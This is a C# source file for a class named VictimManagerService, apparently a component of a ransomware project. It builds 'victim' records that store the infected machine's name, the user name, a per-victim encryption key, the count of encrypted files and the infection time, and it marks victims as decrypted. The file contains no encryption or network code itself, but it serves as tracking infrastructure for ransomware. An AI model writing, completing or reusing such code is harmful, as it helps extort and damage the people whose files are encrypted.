using System;
using System.IO;

namespace CP.Services
{
    public class VictimManagerService
    {
        public victim CreateNewVictim()
        {
            return new victim
            {
                computer_name = Environment.MachineName,
                user_name = Environment.UserName,
                encryption_key = "",
                files_count = 0,
                infected_time = DateTime.Now,
                status = "active"
            };
        }

        public void UpdateVictimStats(victim victim, int encryptedFiles, string encryptionKey)
        {
            victim.files_count = encryptedFiles;
            victim.encryption_key = encryptionKey;
        }

        public void MarkAsDecrypted(victim victim, int decryptedFiles)
        {
            victim.status = "decrypted";
        }

    }
}